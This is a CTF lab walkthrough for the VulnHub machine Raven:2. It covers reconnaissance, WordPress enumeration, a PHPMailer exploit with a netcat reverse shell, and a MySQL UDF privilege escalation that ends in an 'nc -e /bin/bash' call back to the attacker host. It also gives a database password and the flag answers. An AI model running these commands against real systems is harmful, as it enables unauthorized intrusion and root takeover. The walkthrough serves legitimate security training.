

# Raven: 2 Walkthrough

**VulnHub Link:** [Raven:2](https://www.vulnhub.com/entry/raven-2,269/)
**Difficulty:** Easy
**Release Date:** 9 Nov 2018


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.160

dirb 192.168.100.160


## 2.Web Enumeration

we found out website use wordpress

sudo echo 'raven.local		192.168.100.160' > /etc/hosts

wpscan --url 'http://raven2.local/wordpress' -e ap,u

flag1 found from http://192.168.100.160/vendor/PATH
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}

we obtain flag3 from image 
flag3{a0f568aa9de277887f37730d71520d9b}

michael and steven users found

## 3.Exploitation

we found an exploit related to phpmailer

wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Raven%3A2/phpmailer.py

we change host and port in phpmailer.py and run

in another terminal ---> rlwrap nc -nvlp 1234

python phpmailer.py , shell obtained..

flag2 found from /var/www/
flag2{6a8ed560f0b5358ecf844108048eb337} 


then we found mysql root password from /var/www/html/wordpress/wp-config.php

wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Raven%3A2/raven.c

gcc -g -fPIC -shared -o raven.so raven.c

we send this raven.so to attack machine

## 4.Privilege Escalation

mysql -u root -p R@v3nSecurity

>>>use mysql;
>>>create table raven(line blob);
>>>insert into raven values(load_file('/var/tmp/raven.so'));
>>>select *from raven into dumpfile "/usr/lib/mysql/plugin/raven.so";
>>>create function do_system returns integer soname 'raven.so';
>>>select do_system("nc -nv 192.168.100.14 4444 -e /bin/bash"); ---> in another terminal we run ---> nc -nvlp 4444

we obtain root shell and flag4 found...!
